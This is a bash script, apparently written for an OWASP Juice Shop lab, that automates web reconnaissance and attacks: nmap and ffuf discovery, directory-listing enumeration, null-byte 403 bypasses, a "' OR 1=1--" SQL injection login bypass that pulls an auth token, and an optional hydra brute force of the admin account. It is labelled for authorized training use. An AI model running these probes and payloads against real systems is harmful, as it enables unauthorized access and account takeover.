#!/usr/bin/env bash
#
# attack.sh — DISCOVERY-driven recon against the lab. Authentic: it *finds*
# things by enumeration + fuzzing and *detects* flaws by anomaly — it does NOT
# hard-code known answers. Read it as a teaching tool; each phase says what it's
# doing and why. See LEARNING.md to do the same steps by hand.
#
#   AUTHORIZED USE ONLY: your own lab / TryHackMe / HTB / PortSwigger.
#
# Usage:
#   TARGET=http://192.168.0.200:8088 ./attack.sh
#   TARGET=...  ./attack.sh --wordlist /usr/share/wordlists/dirb/common.txt --brute

set -uo pipefail
TARGET="${TARGET:-http://192.168.0.200:8088}"
# portable host/port parse (pure bash — BSD sed on macOS chokes on `t;` labels)
_rest="${TARGET#*://}"; _hostport="${_rest%%/*}"
HOST="${_hostport%%:*}"
case "$_hostport" in
  *:*) PORT="${_hostport##*:}" ;;
  *)   case "$TARGET" in https://*) PORT=443 ;; *) PORT=80 ;; esac ;;
esac

WORDLIST=""; RUN_BRUTE=0
while [ $# -gt 0 ]; do case "$1" in
  --wordlist) WORDLIST="$2"; shift 2;;
  --brute) RUN_BRUTE=1; shift;;
  *) shift;;
esac; done
# pick a wordlist if none given
for w in "$WORDLIST" /usr/share/wordlists/dirb/common.txt \
         /usr/share/seclists/Discovery/Web-Content/common.txt; do
  [ -n "$w" ] && [ -f "$w" ] && WORDLIST="$w" && break
done

have(){ command -v "$1" >/dev/null 2>&1; }
hr(){ printf '\n\033[1;36m== %s ==\033[0m\n' "$1"; }
note(){ printf '   \033[33m→ %s\033[0m\n' "$1"; }

printf '\033[1mTarget:\033[0m %s  (host=%s port=%s)\n' "$TARGET" "$HOST" "$PORT"
curl -fsS -o /dev/null --max-time 5 "$TARGET" && echo "reachable ✓" \
  || { echo "NOT reachable — check Parallels network / Mac firewall / TARGET"; exit 1; }

# 1) RECON ---------------------------------------------------------------------
hr "1. Recon — what's running (nmap)"
if have nmap; then nmap -sV -p "$PORT" "$HOST" | sed -n '/PORT/,/^$/p'
else note "nmap missing (apt install nmap)"; fi

# 2) CONTENT DISCOVERY — fuzz, don't assume (ffuf) ------------------------------
hr "2. Content discovery — fuzz paths from a wordlist (ffuf)"
DISCOVERED=""
if have ffuf && [ -n "$WORDLIST" ]; then
  echo "   wordlist: $WORDLIST"
  # -mc: show 200/301/302/403; -s: quiet (just the hits)
  # -ac: auto-calibrate — SPAs (Juice Shop) return 200 + the same index.html for
  #      ANY path; without this every word is a false positive. -ac learns that
  #      baseline and filters it, leaving only genuinely different responses.
  DISCOVERED="$(ffuf -u "$TARGET/FUZZ" -w "$WORDLIST" -ac -mc 200,301,302,403 -s 2>/dev/null)"
  printf '%s\n' "$DISCOVERED" | sed 's/^/   \/ /' | head -25
else
  note "ffuf or wordlist missing — falling back to a tiny built-in probe"
  for p in robots.txt ftp rest api metrics ; do
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/$p")
    [ "$code" != "404" ] && { printf '   /%-12s %s\n' "$p" "$code"; DISCOVERED="$DISCOVERED"$'\n'"$p"; }
  done
fi

# 3) ENUMERATE listable directories — parse the listing (dynamic, not hard-coded)
hr "3. Enumerate any browsable directory (parse its listing)"
FILES=""
for d in $(printf '%s\n' "$DISCOVERED" | tr -d ' ' | sed 's#/$##' | sort -u); do
  [ -z "$d" ] && continue
  body=$(curl -s --max-time 6 "$TARGET/$d/")
  # a directory listing has multiple <a href="..."> entries
  hrefs=$(printf '%s' "$body" | grep -oiE 'href="[^"?/][^"]*"' | sed -E 's/href="([^"]+)"/\1/' | grep -vE '^\.{1,2}$')
  n=$(printf '%s' "$hrefs" | grep -c . || true)
  if [ "$n" -ge 3 ]; then
    echo "   /$d/ is BROWSABLE — $n entries:"
    printf '%s\n' "$hrefs" | sed 's/^/      /' | head -15
    for f in $hrefs; do FILES="$FILES"$'\n'"$d/$f"; done
  fi
done
[ -z "$(printf '%s' "$FILES" | tr -d '[:space:]')" ] && note "no browsable directory found"

# 4) ACCESS CONTROL — for blocked files, *try* bypasses (don't assume one works)
hr "4. Access control — probe blocked files, fuzz bypasses"
for f in $(printf '%s\n' "$FILES" | sort -u); do
  [ -z "$f" ] && continue
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/$f")
  [ "$code" != "403" ] && continue          # only the blocked ones are interesting
  echo "   /$f -> 403 (blocked) — trying bypasses:"
  for bp in "%2500.md" "%00.md" "%20" "/." ; do
    bc=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/$f$bp")
    if [ "$bc" = "200" ]; then echo "      WORKS ✓  /$f$bp  (HTTP 200)"; break
    else echo "      /$f$bp -> $bc"; fi
  done
done

# 5) INJECTION — detect by ANOMALY, then confirm (don't assume the payload solves)
hr "5. Injection probe — anomaly detection on the login"
LOGIN="$TARGET/rest/user/login"   # you'd find this by watching the login in DevTools
base=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 -X POST "$LOGIN" \
  -H 'Content-Type: application/json' --data '{"email":"a@b.c","password":"x"}')
quote=$(curl -s --max-time 8 -X POST "$LOGIN" \
  -H 'Content-Type: application/json' --data '{"email":"a@b.c'"'"'","password":"x"}')
echo "   normal login  -> HTTP $base"
if printf '%s' "$quote" | grep -qiE 'SQLITE|SQL|syntax|sequelize'; then
  echo "   a single quote triggers a SQL error → likely INJECTABLE ✓"
  tok=$(curl -s --max-time 8 -X POST "$LOGIN" -H 'Content-Type: application/json' \
        --data '{"email":"'"'"' OR 1=1--","password":"x"}' | grep -o '"token":"[^"]\{0,20\}')
  [ -n "$tok" ] && echo "   boolean bypass returns an auth token → CONFIRMED ✓"
else
  echo "   no SQL error surfaced (try other fields / operators by hand)"
fi

# 6) BRUTE FORCE (opt-in) ------------------------------------------------------
hr "6. Brute force (opt-in: --brute)"
if [ "$RUN_BRUTE" -eq 1 ] && have hydra; then
  note "running a tiny hydra demo against the login"
  hydra -l admin@juice-sh.op -P <(printf 'admin123\npassword\nadmin\n') \
    "$HOST" -s "$PORT" http-post-form \
    "/rest/user/login:{\"email\"\\:\"^USER^\"\\,\"password\"\\:\"^PASS^\"}:Invalid" -f 2>&1 | tail -6 || true
else note "skipped (pass --brute, needs hydra)"; fi

hr "Done"
echo "Capture proof with ./evidence.sh — and watch it on the Mac: make hubble-ui"
echo "Want to do these by hand and actually learn? -> LEARNING.md"
